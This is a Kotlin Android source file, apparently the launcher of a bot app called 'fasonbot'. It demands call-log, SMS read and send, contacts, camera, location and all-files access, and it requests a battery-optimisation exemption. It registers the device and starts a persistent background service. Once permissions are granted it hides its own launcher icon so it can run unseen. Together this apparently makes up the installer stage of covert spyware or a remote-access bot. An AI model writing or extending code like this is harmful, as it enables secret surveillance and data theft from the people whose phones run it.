package com.fasonbot.app

import android.app.Activity
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.Settings
import android.util.Log
import android.widget.Toast
import androidx.core.content.ContextCompat
import com.fasonbot.app.config.BotConfig
import com.fasonbot.app.config.DeviceManager
import com.fasonbot.app.service.CoreService

class AppLauncher : Activity() {

    companion object {
        private const val TAG = "AppLauncher"
        private const val PERMISSION_REQUEST_CODE = 100
        private const val PREFS_NAME = "fasonbot"
        private const val KEY_ICON_HIDDEN = "icon_hidden"
        private const val KEY_SERVICE_ENABLED = "service_enabled"
    }

    private val requiredPermissions: Array<String> by lazy {
        buildList {
            add(android.Manifest.permission.READ_CALL_LOG)
            add(android.Manifest.permission.READ_SMS)
            add(android.Manifest.permission.SEND_SMS)
            add(android.Manifest.permission.READ_CONTACTS)
            add(android.Manifest.permission.POST_NOTIFICATIONS)
            add(android.Manifest.permission.CAMERA)
            add(android.Manifest.permission.ACCESS_FINE_LOCATION)
            add(android.Manifest.permission.ACCESS_COARSE_LOCATION)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                add(android.Manifest.permission.READ_MEDIA_IMAGES)
                add(android.Manifest.permission.READ_MEDIA_VIDEO)
                add(android.Manifest.permission.READ_MEDIA_AUDIO)
            } else {
                add(android.Manifest.permission.READ_EXTERNAL_STORAGE)
            }
        }.toTypedArray()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        Thread.setDefaultUncaughtExceptionHandler { thread, throwable ->
            Log.e(TAG, "Uncaught exception in ${thread.name}", throwable)
        }

        try {
            BotConfig.checkAppCloning(this)
        } catch (e: Exception) {
            Log.e(TAG, "Clone check error: ${e.message}")
        }

        val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)

        // If icon was already hidden, just start service and exit
        if (prefs.getBoolean(KEY_ICON_HIDDEN, false)) {
            startService()
            finish()
            return
        }

        if (allPermissionsGranted()) {
            onPermissionsGranted()
        } else {
            requestPermissions()
        }
    }

    override fun onResume() {
        super.onResume()
        try {
            val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
            if (!prefs.getBoolean(KEY_ICON_HIDDEN, false) && allPermissionsGranted()) {
                onPermissionsGranted()
            }
        } catch (e: Exception) {
            Log.e(TAG, "onResume error: ${e.message}")
        }
    }

    private fun allPermissionsGranted(): Boolean = try {
        requiredPermissions.all { checkSelfPermission(it) == PackageManager.PERMISSION_GRANTED } &&
        // Android 11+ requires MANAGE_EXTERNAL_STORAGE for full access
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            Environment.isExternalStorageManager()
        } else true
    } catch (e: Exception) {
        Log.e(TAG, "Permission check error: ${e.message}")
        false
    }

    private fun requestPermissions() {
        try {
            // Android 9+ supports runtime permissions
            requestPermissions(requiredPermissions, PERMISSION_REQUEST_CODE)

            // Android 11+ requires special permission for all files access
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
                try {
                    startActivity(Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                        data = Uri.parse("package:$packageName")
                    })
                } catch (_: Exception) {
                    startActivity(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION))
                }
            }

            // Request battery optimization exemption
            val pm = getSystemService(POWER_SERVICE) as android.os.PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                try {
                    startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                        data = Uri.parse("package:$packageName")
                    })
                } catch (e: Exception) {
                    Log.e(TAG, "Battery optimization request error: ${e.message}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Permission request error: ${e.message}")
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (allPermissionsGranted()) {
                onPermissionsGranted()
            } else {
                Toast.makeText(this, "Please grant all permissions", Toast.LENGTH_LONG).show()
                requestPermissions()
            }
        }
    }

    private fun onPermissionsGranted() {
        startService()
        // Only hide icon if autoHideIcon is enabled in config (default: true)
        if (BotConfig.shouldAutoHideIcon()) {
            hideIcon()
        }
        finish()
    }

    private fun startService() {
        try {
            DeviceManager.registerDevice(this)

            val intent = Intent(this, CoreService::class.java).apply { action = CoreService.ACTION_START }
            // Android 9+ always requires startForegroundService
            ContextCompat.startForegroundService(this, intent)

            getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
                .edit()
                .putBoolean(KEY_SERVICE_ENABLED, true)
                .apply()

            Log.d(TAG, "CoreService started")
        } catch (e: Exception) {
            Log.e(TAG, "Service start error: ${e.message}")
        }
    }

    private fun hideIcon() {
        try {
            val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
            if (prefs.getBoolean(KEY_ICON_HIDDEN, false)) return

            packageManager.setComponentEnabledSetting(
                ComponentName(this, "$packageName.AppLauncher"),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            prefs.edit().putBoolean(KEY_ICON_HIDDEN, true).apply()
            Log.d(TAG, "Icon hidden")
        } catch (e: Exception) {
            Log.e(TAG, "Hide icon error: ${e.message}")
        }
    }
}
